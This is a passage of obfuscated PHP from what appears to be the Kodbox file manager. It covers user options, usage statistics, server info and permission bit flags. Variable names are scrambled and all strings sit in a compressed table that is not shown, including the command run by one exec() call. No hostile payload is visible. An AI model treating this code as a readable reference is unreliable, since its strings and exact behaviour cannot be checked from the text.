(!in_array($˚øö≤À¢[$ˆÇ ◊œ–[97]], $¶∆¢ÂÇå)) { $¡◊˙ìë¿[$˚øö≤À¢[$ˆÇ ◊œ–[97]]] = $˚øö≤À¢[$ˆÇ ◊œ–[459]]; } } $ﬁ£îı¶û = $¡◊˙ìë¿; } unset($ﬁ£îı¶û); $à›ä‰˝√ = Model($ˆÇ ◊œ–[2488]); foreach ($¡≠ë‚Áµ as &$’ªà¥∫˜) { $ÂËø¶–ª = array(); if (isset($—…⁄Ñç◊[$’ªà¥∫˜[$ˆÇ ◊œ–[1764]]])) { $ÂËø¶–ª = $—…⁄Ñç◊[$’ªà¥∫˜[$ˆÇ ◊œ–[1764]]]; } $’ªà¥∫˜[$ˆÇ ◊œ–[2489]] = array(); if (isset($ÂËø¶–ª[$˘ï≤”è˛])) { $’ªà¥∫˜[$ˆÇ ◊œ–[2489]] = $à›ä‰˝√->getUserJobInfo($ÂËø¶–ª[$˘ï≤”è˛]); } } unset($’ªà¥∫˜); } protected function groupUserAll($·◊ÇöÆ≥) { $≠¢Æ¸∑“ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$·◊ÇöÆ≥) { return !1; } $Òá«§œõ = Model($≠¢Æ¸∑“[2057])->field($≠¢Æ¸∑“[1764])->where(array($≠¢Æ¸∑“[1963] => array($≠¢Æ¸∑“[7], $·◊ÇöÆ≥)))->select(); $Òá«§œõ = array_to_keyvalue($Òá«§œõ, $≠¢Æ¸∑“[12], $≠¢Æ¸∑“[1764]); return array_unique($Òá«§œõ); } public function userSearch($÷ÜØ¿≤Â, $Óì¢∑±ô = "\x2a") { return Model($_SERVER[ß⁄ˆÇ†Œ][606])->where($÷ÜØ¿≤Â)->field($Óì¢∑±ô)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\x5f\157\x70\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($êÏπÑ⁄) { $ôÎÍÜÅ¥ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ω÷∑†ÃÆ = defined($ôÎÍÜÅ¥[2189]) && USER_ID ? USER_ID : $ôÎÍÜÅ¥[12]; return "\x55\x73\x65\x72\117\x70\164\151\x6f\156\x5f{$êÏπÑ⁄}\137" . $Ω÷∑†ÃÆ; } protected function filterWhere($¿‰æÙ‘è) { $§ááÏÈü =& $_SERVER[ß⁄ˆÇ†Œ]; $¿‰æÙ‘è[$§ááÏÈü[1764]] = defined($§ááÏÈü[2189]) && USER_ID ? USER_ID : $§ááÏÈü[12]; return $¿‰æÙ‘è; } public function cacheRemoveUser($Í¬ˆº˘È, $˙Ò≤ëÂﬂ) { return Cache::remove("\x55\163\145\x72\117\160\164\151\157\x6e\137{$Í¬ˆº˘È}\137" . $˙Ò≤ëÂﬂ); } protected function optionDefault($¯¨≈˝Ï˙ = '') { $Á⁄∏Ì≥é =& $_SERVER[ß⁄ˆÇ†Œ]; if ($¯¨≈˝Ï˙ == $Á⁄∏Ì≥é[12]) { return $GLOBALS[$Á⁄∏Ì≥é[6]][$Á⁄∏Ì≥é[2490]]; } if ($¯¨≈˝Ï˙ == $Á⁄∏Ì≥é[2491]) { return $GLOBALS[$Á⁄∏Ì≥é[6]][$Á⁄∏Ì≥é[2492]]; } } } goto FûµïËøΩ•; dÂ«‰¨äÍ·: define($_SERVER[ß⁄ˆÇ†Œ][0], $_SERVER[ß⁄ˆÇ†Œ][1]); $_SERVER[Ú›Ë•ÓÌ] = explode($_SERVER[ß⁄ˆÇ†Œ][2], gzinflate(substr($_SERVER[ß⁄ˆÇ†Œ][3], 10, -8))); function binCheckEq($§Ë„ÖîΩ, $óÂî∞ú˝) { return $§Ë„ÖîΩ == $óÂî∞ú˝; } goto a·»•Û†–Ê; A≠Ïô≥—¬†: class AnalysisModel extends ModelBaseLight { public function init($ëÇÿö¶€) { $„«ú≠ëê =& $_SERVER[ß⁄ˆÇ†Œ]; $’ıñƒœá = array($„«ú≠ëê[670] => array($„«ú≠ëê[33] => $„«ú≠ëê[1891], $„«ú≠ëê[359] => array($„«ú≠ëê[255], $„«ú≠ëê[838], $„«ú≠ëê[1892], $„«ú≠ëê[1893])), $„«ú≠ëê[1894] => array($„«ú≠ëê[33] => $„«ú≠ëê[1895], $„«ú≠ëê[359] => array($„«ú≠ëê[255], $„«ú≠ëê[836], $„«ú≠ëê[1896], $„«ú≠ëê[1897], $„«ú≠ëê[1898]))); if (!isset($’ıñƒœá[$ëÇÿö¶€])) { return !1; } $this->optionType = $’ıñƒœá[$ëÇÿö¶€][$„«ú≠ëê[33]]; $this->field = $’ıñƒœá[$ëÇÿö¶€][$„«ú≠ëê[359]]; return !0; } public function listData($Íî¬◊…Ω = false, $‰â¢Ø∏÷ = "\x6d\157\144\151\x66\171\124\x69\x6d\145", $æÊº∏©£ = false) { return parent::listData($Íî¬◊…Ω, $‰â¢Ø∏÷, $æÊº∏©£); } public function trendList($Üôñ√øÑ) { $Ω∆ôîê§ =& $_SERVER[ß⁄ˆÇ†Œ]; $í¯¯ú∫À = $this->listData(); if ($í¯¯ú∫À) { $Ü™Ùå˘¡ = end($í¯¯ú∫À); $¿›èôèò = date($Ω∆ôîê§[1899], strtotime($Ω∆ôîê§[1900])); if ($Ü™Ùå˘¡[$Ω∆ôîê§[255]] == $¿›èôèò) { return $í¯¯ú∫À; } $©‹∑˘Ôá = strtotime($Ü™Ùå˘¡[$Ω∆ôîê§[255]]); } if (!isset($©‹∑˘Ôá)) { $≥¶ÖÙ÷Æ = $Üôñ√øÑ == $Ω∆ôîê§[670] ? $Ω∆ôîê§[606] : $Ω∆ôîê§[897]; $©‹∑˘Ôá = Model($≥¶ÖÙ÷Æ)->min($Ω∆ôîê§[231]); } $ﬂö‚òë– = $Ω∆ôîê§[1901] . ucfirst($Üôñ√øÑ); $“à◊¥˜Ï = $this->dateList($©‹∑˘Ôá); foreach ($“à◊¥˜Ï as $¿›èôèò) { $this->{$ﬂö‚òë–}($¿›èôèò); } return $this->listData(); } private function dateList($æ√ñ·»£) { $¯©—§ÆÁ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ÿ¬µõ◊• = $æ√ñ·»£; $ˆ»¥ï◊§ = strtotime($¯©—§ÆÁ[1900]); $ÒÁ∑ÑÛ© = array(); while ($Ÿ¬µõ◊• <= $ˆ»¥ï◊§) { $ÒÁ∑ÑÛ©[] = date($¯©—§ÆÁ[1899], $Ÿ¬µõ◊•); $Ÿ¬µõ◊• = strtotime($¯©—§ÆÁ[1902], $Ÿ¬µõ◊•); } return $ÒÁ∑ÑÛ©; } public function _recordUser($ûË˙ò∫— = '') { $·ª∆ÕÏ± =& $_SERVER[ß⁄ˆÇ†Œ]; $©äÄ»Èœ = strtotime(date($·ª∆ÕÏ±[1903], strtotime($ûË˙ò∫—))); $àª∫Êïé = strtotime(date($·ª∆ÕÏ±[1904], strtotime($ûË˙ò∫—))); $Êﬁù‹âπ = array($·ª∆ÕÏ±[231] => array($·ª∆ÕÏ±[1087], $àª∫Êïé)); $êÌ˘Ê©◊ = Model($·ª∆ÕÏ±[606])->where($Êﬁù‹âπ)->count($·ª∆ÕÏ±[1764]); $Êﬁù‹âπ[$·ª∆ÕÏ±[231]] = array($·ª∆ÕÏ±[418], array($©äÄ»Èœ, $àª∫Êïé)); $ú≈ôŸºä = Model($·ª∆ÕÏ±[606])->where($Êﬁù‹âπ)->count($·ª∆ÕÏ±[1764]); $Êﬁù‹âπ[$·ª∆ÕÏ±[33]] = $·ª∆ÕÏ±[1905]; $ÜâæŒ¢Ú = Model($·ª∆ÕÏ±[1906])->where($Êﬁù‹âπ)->count($·ª∆ÕÏ±[1907]); $…©œ‰çÕ = array($·ª∆ÕÏ±[255] => $ûË˙ò∫—, $·ª∆ÕÏ±[838] => (int) $êÌ˘Ê©◊, $·ª∆ÕÏ±[1892] => (int) $ú≈ôŸºä, $·ª∆ÕÏ±[1893] => (int) $ÜâæŒ¢Ú); return $this->insert($…©œ‰çÕ); } public function _recordStore($ì¿¥¢¯ﬁ = '') { $ÔŸ™‘ú≈ =& $_SERVER[ß⁄ˆÇ†Œ]; $†ÿØÑ¡˛ = strtotime(date($ÔŸ™‘ú≈[1904], strtotime($ì¿¥¢¯ﬁ))); $≈ã¿¢æ€ = array($ÔŸ™‘ú≈[231] => array($ÔŸ™‘ú≈[1087], $†ÿØÑ¡˛)); $œÿúëì≠ = Model($ÔŸ™‘ú≈[552])->where($≈ã¿¢æ€)->sum($ÔŸ™‘ú≈[79]); $≈ã¿¢æ€[$ÔŸ™‘ú≈[493]] = 0; $‰à‘ÈÖ† = Model($ÔŸ™‘ú≈[897])->where($≈ã¿¢æ€)->sum($ÔŸ™‘ú≈[79]); $≈ã¿¢æ€[$ÔŸ™‘ú≈[190]] = 1; $”˙ÏÔüÄ = Model($ÔŸ™‘ú≈[897])->where($≈ã¿¢æ€)->sum($ÔŸ™‘ú≈[79]); $≈ã¿¢æ€[$ÔŸ™‘ú≈[190]] = 2; $¿÷–ÁÁ˙ = Model($ÔŸ™‘ú≈[897])->where($≈ã¿¢æ€)->sum($ÔŸ™‘ú≈[79]); $Õ§£ÁÊç = array($ÔŸ™‘ú≈[255] => $ì¿¥¢¯ﬁ, $ÔŸ™‘ú≈[836] => (int) $‰à‘ÈÖ†, $ÔŸ™‘ú≈[1896] => (int) $œÿúëì≠, $ÔŸ™‘ú≈[1897] => (int) $”˙ÏÔüÄ, $ÔŸ™‘ú≈[1898] => (int) $¿÷–ÁÁ˙); return $this->insert($Õ§£ÁÊç); } public function trend($¿ÒúÂÜ‘, $®≈∂∆≈˘) { $ò¨öòûù =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->init($¿ÒúÂÜ‘)) { return !1; } $®√õËÎ” = $this->trendList($¿ÒúÂÜ‘); if ($®√õËÎ” && $®≈∂∆≈˘ != $ò¨öòûù[1737]) { $ˆŒ˘Èß£ = $®√õËÎ”[0][$ò¨öòûù[255]]; $“™¿–“  = $this->validDate($®≈∂∆≈˘, $ˆŒ˘Èß£); $ÆÕ∫ê⁄≠ = array(); $°∞¨™∆ü = array_to_keyvalue($®√õËÎ”, $ò¨öòûù[255]); foreach ($“™¿–“  as $ö˚∞≤˚») { if (isset($°∞¨™∆ü[$ö˚∞≤˚»])) { $ï≠ùìπö = $°∞¨™∆ü[$ö˚∞≤˚»]; } else { $ï≠ùìπö = end($®√õËÎ”); $ï≠ùìπö[$ò¨öòûù[255]] = $ö˚∞≤˚»; if ($¿ÒúÂÜ‘ == $ò¨öòûù[670]) { $ï≠ùìπö[$ò¨öòûù[1892]] = $ï≠ùìπö[$ò¨öòûù[1893]] = 0; } } $ÆÕ∫ê⁄≠[] = $ï≠ùìπö; } $®√õËÎ” = $ÆÕ∫ê⁄≠; } $Æ∑Ïê∏Œ = array($ò¨öòûù[670] => array($ò¨öòûù[838] => LNG($ò¨öòûù[1908]), $ò¨öòûù[1892] => LNG($ò¨öòûù[1909]), $ò¨öòûù[1893] => LNG($ò¨öòûù[1910])), $ò¨öòûù[1894] => array($ò¨öòûù[836] => LNG($ò¨öòûù[1911]), $ò¨öòûù[1896] => LNG($ò¨öòûù[1912]), $ò¨öòûù[1897] => LNG($ò¨öòûù[1913]), $ò¨öòûù[1898] => LNG($ò¨öòûù[1914]))); $˛óæï⁄¿ = array($ò¨öòûù[670] => $ò¨öòûù[1915], $ò¨öòûù[1894] => $ò¨öòûù[79]); if (empty($®√õËÎ”)) { $ö˚∞≤˚» = date($ò¨öòûù[1899], strtotime($ò¨öòûù[1900])); $À‚åÉ´† = array($ò¨öòûù[255] => $ö˚∞≤˚»); foreach ($Æ∑Ïê∏Œ[$¿ÒúÂÜ‘] as $ÏÜ‚œÀÃ => $∫‘÷∆Â—) { $À‚åÉ´†[$ÏÜ‚œÀÃ] = 0; } $®√õËÎ”[] = $À‚åÉ´†; } $ ˜µÅ‘û = array(); foreach ($®√õËÎ” as $∫‘÷∆Â—) { if ($¿ÒúÂÜ‘ == $ò¨öòûù[1894] && $∫‘÷∆Â—[$ò¨öòûù[1896]] > $∫‘÷∆Â—[$ò¨öòûù[836]]) { $∫‘÷∆Â—[$ò¨öòûù[1896]] = $∫‘÷∆Â—[$ò¨öòûù[836]]; } foreach ($Æ∑Ïê∏Œ[$¿ÒúÂÜ‘] as $ÏÜ‚œÀÃ => $Æ˚ã°Ñû) { $ï≠ùìπö = array($ò¨öòûù[255] => $∫‘÷∆Â—[$ò¨öòûù[255]], $ò¨öòûù[1653] => $Æ˚ã°Ñû); $ï≠ùìπö[$˛óæï⁄¿[$¿ÒúÂÜ‘]] = isset($∫‘÷∆Â—[$ÏÜ‚œÀÃ]) ? $∫‘÷∆Â—[$ÏÜ‚œÀÃ] : 0; $ ˜µÅ‘û[] = $ï≠ùìπö; } } return $ ˜µÅ‘û; } public function validDate($ì≠£œ·§, $¥êå””Ú) { $ª∫¿öÈè =& $_SERVER[ß⁄ˆÇ†Œ]; $‰í»∂Ü¬ = date($ª∫¿öÈè[1899], strtotime($ª∫¿öÈè[1900])); $∞…ã„ÇÖ = array($‰í»∂Ü¬); switch ($ì≠£œ·§) { case $ª∫¿öÈè[1744]: $∆ô˛Åæ¯ = mktime(0, 0, 0, date($ª∫¿öÈè[1916]), date($ª∫¿öÈè[1445]) - date($ª∫¿öÈè[1535]) + 7 - 7, date($ª∫¿öÈè[1917])); $´¬ı¢ Œ = 0; do { $˘øÓ¢¥¢ = date($ª∫¿öÈè[1899], $∆ô˛Åæ¯ - 3600 * 24 * 7 * $´¬ı¢ Œ); $∞…ã„ÇÖ[] = $˘øÓ¢¥¢; $´¬ı¢ Œ++; } while ($¥êå””Ú < $˘øÓ¢¥¢); break; case $ª∫¿öÈè[1742]: $´¬ı¢ Œ = 1; do { $ãŒ†Ëù› = date($ª∫¿öÈè[1918], strtotime("\x2d\40{$´¬ı¢ Œ}\40\155\x6f\x6e\164\x68\x73")); $∞…ã„ÇÖ[] = $ãŒ†Ëù›; $´¬ı¢ Œ++; } while ($¥êå””Ú < $ãŒ†Ëù›); break; case $ª∫¿öÈè[1919]: $Ñ¢Ô≥˝Ó = (int) date($ª∫¿öÈè[1917], strtotime($¥êå””Ú)); $Èö©Ø‘± = (int) date($ª∫¿öÈè[1917]); if ($Ñ¢Ô≥˝Ó >= $Èö©Ø‘±) { break; } for ($Ñ¢Ô≥˝Ó; $Ñ¢Ô≥˝Ó < $Èö©Ø‘±; $Ñ¢Ô≥˝Ó++) { $∞…ã„ÇÖ[] = $Ñ¢Ô≥˝Ó . $ª∫¿öÈè[1920]; } break; default: break; } if ($¥êå””Ú > end($∞…ã„ÇÖ)) { array_pop($∞…ã„ÇÖ); } sort($∞…ã„ÇÖ); return $∞…ã„ÇÖ; } public function listTable($¬§ø¨…Ú) { $Å…ëì∫º = ucfirst($¬§ø¨…Ú); return Model($Å…ëì∫º)->listData(); } public function option($•Êé æ’) { $“…˙ëŒÌ = $_SERVER[ß⁄ˆÇ†Œ][1921] . ucfirst($•Êé æ’); return $this->{$“…˙ëŒÌ}(); } private function optionUser() { $π«Ç–°∂ =& $_SERVER[ß⁄ˆÇ†Œ]; $ê÷≥§Ü = Model($π«Ç–°∂[606])->count($π«Ç–°∂[1764]); $∑·Ê™ºÄ = Model($π«Ç–°∂[606])->where($π«Ç–°∂[1922])->count($π«Ç–°∂[1764]); $¢‘·ì±¬ = intval($GLOBALS[$π«Ç–°∂[6]][$π«Ç–°∂[434]][$π«Ç–°∂[1710]]) / 3600; $¸˝–…ﬁÓ = strtotime("\55{$¢‘·ì±¬}\x20\150\157\x75\162\163"); $ì¶Í√È‚ = strtotime(date($π«Ç–°∂[1903])); if ($¸˝–…ﬁÓ < $ì¶Í√È‚) { $¸˝–…ﬁÓ = $ì¶Í√È‚; } $ÇçèË—– = array($π«Ç–°∂[1923] => array($π«Ç–°∂[1088], $¸˝–…ﬁÓ)); $äùöÊù« = (int) Model($π«Ç–°∂[606])->where($ÇçèË—–)->count($π«Ç–°∂[1764]); if (!$äùöÊù«) { $äùöÊù« = 1; } $ÇçèË—– = array($π«Ç–°∂[1923] => array($π«Ç–°∂[1088], $ì¶Í√È‚)); $§Ë≤∫âØ = Model($π«Ç–°∂[606])->where($ÇçèË—–)->count($π«Ç–°∂[1764]); return array($π«Ç–°∂[831] => (int) $ê÷≥§Ü, $π«Ç–°∂[1924] => (int) ($ê÷≥§Ü - $∑·Ê™ºÄ), $π«Ç–°∂[1925] => (int) $∑·Ê™ºÄ, $π«Ç–°∂[1926] => (int) $§Ë≤∫âØ, $π«Ç–°∂[1927] => $äùöÊù«); } private function optionFile() { $Ó˜Ì“œî =& $_SERVER[ß⁄ˆÇ†Œ]; $œ¢¶Í©¿ = $this->sourceSize(); $ÎË‚˘≥Ñ = $œ¢¶Í©¿[$Ó˜Ì“œî[79]]; $µû„’¨‚ = $œ¢¶Í©¿[$Ó˜Ì“œî[1896]]; $ßﬁ€˝Ñπ = Model($Ó˜Ì“œî[897])->where(array($Ó˜Ì“œî[493] => 0))->count($Ó˜Ì“œî[193]); $◊˛∫¬˘œ = array($Ó˜Ì“œî[493] => 0, $Ó˜Ì“œî[231] => array($Ó˜Ì“œî[1088], strtotime(date($Ó˜Ì“œî[1903])))); $›ÎÒÍù˜ = Model($Ó˜Ì“œî[897])->where($◊˛∫¬˘œ)->sum($Ó˜Ì“œî[79]); $§ÜƒŒéü = Model($Ó˜Ì“œî[897])->where($◊˛∫¬˘œ)->count($Ó˜Ì“œî[193]); return array($Ó˜Ì“œî[836] => $ÎË‚˘≥Ñ, $Ó˜Ì“œî[1896] => $µû„’¨‚, $Ó˜Ì“œî[1928] => $ÎË‚˘≥Ñ - $µû„’¨‚, $Ó˜Ì“œî[1929] => (int) $›ÎÒÍù˜, $Ó˜Ì“œî[838] => (int) $ßﬁ€˝Ñπ, $Ó˜Ì“œî[1930] => (int) $§ÜƒŒéü); } private function optionAccess() { $•∆îî≈¯ =& $_SERVER[ß⁄ˆÇ†Œ]; return array($•∆îî≈¯[831] => $this->typeLogCnt(), $•∆îî≈¯[110] => $this->typeLogCnt($•∆îî≈¯[110]), $•∆îî≈¯[533] => $this->typeLogCnt($•∆îî≈¯[533]), $•∆îî≈¯[1931] => $this->typeLogCnt($•∆îî≈¯[1931]), $•∆îî≈¯[1932] => $this->typeLogCnt($•∆îî≈¯[1932]), $•∆îî≈¯[670] => $this->typeLogCnt($•∆îî≈¯[12], $•∆îî≈¯[1907])); } private function typeLogCnt($Ô‚§ ´∑ = '', $î”ƒ¯∆¡ = "\151\144") { $¨ú”°ÀÆ =& $_SERVER[ß⁄ˆÇ†Œ]; $π∞…›»É = array($¨ú”°ÀÆ[110] => array($¨ú”°ÀÆ[1933], $¨ú”°ÀÆ[1934]), $¨ú”°ÀÆ[533] => array($¨ú”°ÀÆ[1935], $¨ú”°ÀÆ[1936]), $¨ú”°ÀÆ[1931] => array($¨ú”°ÀÆ[1937], $¨ú”°ÀÆ[1938], $¨ú”°ÀÆ[1939]), $¨ú”°ÀÆ[1932] => array($¨ú”°ÀÆ[1940], $¨ú”°ÀÆ[1941]), $¨ú”°ÀÆ[1942] => array($¨ú”°ÀÆ[1943], $¨ú”°ÀÆ[1944], $¨ú”°ÀÆ[1945])); $‰„∆»Ú¿ = strtotime(date($¨ú”°ÀÆ[1903])); $ü∂ô≈Îª = array($¨ú”°ÀÆ[231] => array($¨ú”°ÀÆ[1088], $‰„∆»Ú¿)); if ($Ô‚§ ´∑) { $ü∂ô≈Îª[$¨ú”°ÀÆ[33]] = array($¨ú”°ÀÆ[7], $π∞…›»É[$Ô‚§ ´∑]); } $¯ÒıëüÖ = Model($¨ú”°ÀÆ[1906])->where($ü∂ô≈Îª)->count($î”ƒ¯∆¡); return (int) $¯ÒıëüÖ; } private function optionServer() { $Ûà˜ñÑ¢ =& $_SERVER[ß⁄ˆÇ†Œ]; $£´õ¢ı° = $this->diskDriver(); $”È€®ï‡ = KodIO::defaultDriver(); $à∑ùÔ√° = array($Ûà˜ñÑ¢[890] => $”È€®ï‡[$Ûà˜ñÑ¢[483]]); $êÏ«‰⁄˘ = Model($Ûà˜ñÑ¢[552])->where($à∑ùÔ√°)->sum($Ûà˜ñÑ¢[79]); $ÔÇàÆÁ∆ = explode($Ûà˜ñÑ¢[53], $_SERVER[$Ûà˜ñÑ¢[147]]); $ïÕ≠‡à = $ÔÇàÆÁ∆[0]; $çÛ  ”÷ = $GLOBALS[$Ûà˜ñÑ¢[6]][$Ûà˜ñÑ¢[21]]; $à—±§œÄ = $çÛ  ”÷[$Ûà˜ñÑ¢[1050]]; if ($à—±§œÄ == $Ûà˜ñÑ¢[1038]) { $”Ã›≤Ì› = explode($Ûà˜ñÑ¢[1364], $çÛ  ”÷[$Ûà˜ñÑ¢[1049]]); $à—±§œÄ = $”Ã›≤Ì›[0]; } if ($à—±§œÄ == $Ûà˜ñÑ¢[986] || $à—±§œÄ == $Ûà˜ñÑ¢[877]) { $Êáıï”È = Model()->db()->query($Ûà˜ñÑ¢[1946]); $ªË¨†ÛÅ = $Êáıï”È[0] && isset($Êáıï”È[0][$Ûà˜ñÑ¢[1652]]) ? $Êáıï”È[0][$Ûà˜ñÑ¢[1652]] : 0; $à—±§œÄ = $Ûà˜ñÑ¢[1947] . ($ªË¨†ÛÅ ? $Ûà˜ñÑ¢[8] . $ªË¨†ÛÅ : $Ûà˜ñÑ¢[12]); } $’Ãﬂ®ﬁª = $GLOBALS[$Ûà˜ñÑ¢[6]][$Ûà˜ñÑ¢[434]][$Ûà˜ñÑ¢[899]]; return array($Ûà˜ñÑ¢[1948] => $£´õ¢ı° ? $£´õ¢ı°[$Ûà˜ñÑ¢[1949]] : 0, $Ûà˜ñÑ¢[1950] => $£´õ¢ı° ? $£´õ¢ı°[$Ûà˜ñÑ¢[1951]] : 0, $Ûà˜ñÑ¢[1952] => (int) $”È€®ï‡[$Ûà˜ñÑ¢[1949]] * 1024 * 1024 * 1024, $Ûà˜ñÑ¢[1953] => (int) $êÏ«‰⁄˘, $Ûà˜ñÑ¢[1954] => ucfirst($ïÕ≠‡à), $Ûà˜ñÑ¢[1955] => $Ûà˜ñÑ¢[1956] . PHP_VERSION, $Ûà˜ñÑ¢[1957] => phpBuild64() ? 64 : 32, $Ûà˜ñÑ¢[830] => str_replace($Ûà˜ñÑ¢[1207], $Ûà˜ñÑ¢[1066], $à—±§œÄ), $Ûà˜ñÑ¢[434] => ucfirst($’Ãﬂ®ﬁª), $Ûà˜ñÑ¢[32] => $_SERVER[$Ûà˜ñÑ¢[1958]]); } private function diskDriver() { $†û∆≤·÷ =& $_SERVER[ß⁄ˆÇ†Œ]; $´‚Ø¢öÕ = $†û∆≤·÷[8]; $¥∏√⁄Ø∑ = $GLOBALS[$†û∆≤·÷[6]][$†û∆≤·÷[1381]] == $†û∆≤·÷[1382]; if ($¥∏√⁄Ø∑) { $´‚Ø¢öÕ = $†û∆≤·÷[1959]; if (function_exists($†û∆≤·÷[1960])) { exec($†û∆≤·÷[1961], $˘ü…∞¶±); $´‚Ø¢öÕ = $˘ü…∞¶±[1] . $†û∆≤·÷[8]; } } if (!file_exists($´‚Ø¢öÕ)) { return; } if (!function_exists($†û∆≤·÷[1962])) { return; } $í…¯ã‡ı = @disk_total_space($´‚Ø¢öÕ); $•§¯ıûë = $í…¯ã‡ı - @disk_free_space($´‚Ø¢öÕ); return array($†û∆≤·÷[1949] => $í…¯ã‡ı, $†û∆≤·÷[1951] => $•§¯ıûë); } public function fileChart($⁄ØÉ¢∂‚) { $∆å˛Ùπª =& $_SERVER[ß⁄ˆÇ†Œ]; if (isset($⁄ØÉ¢∂‚[$∆å˛Ùπª[1764]])) { return Model($∆å˛Ùπª[897])->userFileTypeProfile($⁄ØÉ¢∂‚[$∆å˛Ùπª[1764]]); } if (isset($⁄ØÉ¢∂‚[$∆å˛Ùπª[1963]])) { return Model($∆å˛Ùπª[897])->groupFileTypeProfile($⁄ØÉ¢∂‚[$∆å˛Ùπª[1963]]); } $ËÒ√Œ…Ë = $this->sourceSize(); $¯‰‡¡ÿÁ = array($∆å˛Ùπª[192] => 0, $∆å˛Ùπª[190] => 1); $õÄ≈Ω‰Ñ = Model($∆å˛Ùπª[897])->where($¯‰‡¡ÿÁ)->sum($∆å˛Ùπª[79]); $¯‰‡¡ÿÁ[$∆å˛Ùπª[190]] = 2; $É‘Ä¥üÉ = Model($∆å˛Ùπª[897])->where($¯‰‡¡ÿÁ)->sum($∆å˛Ùπª[79]); return array($∆å˛Ùπª[836] => $ËÒ√Œ…Ë[$∆å˛Ùπª[79]], $∆å˛Ùπª[1896] => $ËÒ√Œ…Ë[$∆å˛Ùπª[1896]], $∆å˛Ùπª[1897] => (int) $õÄ≈Ω‰Ñ, $∆å˛Ùπª[1898] => (int) $É‘Ä¥üÉ); } private function sourceSize() { $¯Î«íÖ® =& $_SERVER[ß⁄ˆÇ†Œ]; $ÆËê´®π = Model($¯Î«íÖ®[897])->where(array($¯Î«íÖ®[493] => 0))->sum($¯Î«íÖ®[79]); $∫´ﬁ©≈„ = Model($¯Î«íÖ®[552])->sum($¯Î«íÖ®[79]); if ($∫´ﬁ©≈„ > $ÆËê´®π) { $∫´ﬁ©≈„ = $ÆËê´®π; } return array($¯Î«íÖ®[79] => (int) $ÆËê´®π, $¯Î«íÖ®[1896] => (int) $∫´ﬁ©≈„); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $‡Û˝æ®© =& $_SERVER[ß⁄ˆÇ†Œ]; $Ì˛Ëæ¬õ = array(array($‡Û˝æ®©[502] => LNG($‡Û˝æ®©[1964]), $‡Û˝æ®©[1965] => $‡Û˝æ®©[1966], $‡Û˝æ®©[1967] => 1, $‡Û˝æ®©[1968] => 1, $‡Û˝æ®©[1969] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($‡Û˝æ®©[502] => LNG($‡Û˝æ®©[1970]), $‡Û˝æ®©[1965] => $‡Û˝æ®©[1971], $‡Û˝æ®©[1967] => 2, $‡Û˝æ®©[1968] => 1, $‡Û˝æ®©[1969] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($‡Û˝æ®©[502] => LNG($‡Û˝æ®©[1972]), $‡Û˝æ®©[1965] => $‡Û˝æ®©[1973], $‡Û˝æ®©[1967] => 3, $‡Û˝æ®©[1968] => 1, $‡Û˝æ®©[1969] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($‡Û˝æ®©[502] => LNG($‡Û˝æ®©[1974]), $‡Û˝æ®©[1965] => $‡Û˝æ®©[1975], $‡Û˝æ®©[1967] => 4, $‡Û˝æ®©[1968] => 1, $‡Û˝æ®©[1969] => self::AUTH_SHOW | self::AUTH_VIEW), array($‡Û˝æ®©[502] => LNG($‡Û˝æ®©[1976]), $‡Û˝æ®©[1965] => $‡Û˝æ®©[1977], $‡Û˝æ®©[1967] => 5, $‡Û˝æ®©[1968] => 1, $‡Û˝æ®©[1969] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($‡Û˝æ®©[502] => LNG($‡Û˝æ®©[1978]), $‡Û˝æ®©[1965] => $‡Û˝æ®©[1979], $‡Û˝æ®©[1967] => 6, $‡Û˝æ®©[1968] => 1, $‡Û˝æ®©[1969] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($‡Û˝æ®©[502] => LNG($‡Û˝æ®©[1980]), $‡Û˝æ®©[1965] => $‡Û˝æ®©[1981], $‡Û˝æ®©[1967] => 7, $‡Û˝æ®©[1968] => 1, $‡Û˝æ®©[1969] => 0)); return $Ì˛Ëæ¬õ; } public static function authCheck($∂‰ÔÁÈ, $óòÃ∑•â) { $™•‘⁄·ï =& $_SERVER[ß⁄ˆÇ†Œ]; $∂‰ÔÁÈ = intval($∂‰ÔÁÈ); if (KodUser::isRoot() && $GLOBALS[$™•‘⁄·ï[6]][$™•‘⁄·ï[1982]]) { return !0; } if ($∂‰ÔÁÈ <= 0) { return !1; } if (($∂‰ÔÁÈ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($∂‰ÔÁÈ & $óòÃ∑•â); } public static function authCheckShow($ÈÏ®øÛ”) { return self::authCheck($ÈÏ®øÛ”, self::AUTH_SHOW); } public static function authCheckView($…óè„»‡) { return self::authCheck($…óè„»‡, self::AUTH_VIEW); } public static function authCheckDownload($¥ÀÍÌæ¿) { return self::authCheck($¥ÀÍÌæ¿, self::AUTH_DOWNLOAD); } public static function authCheckUpload($§°ÛáÜ˛) { return self::authCheck($§°ÛáÜ˛, self::AUTH_UPLOAD); } public static function 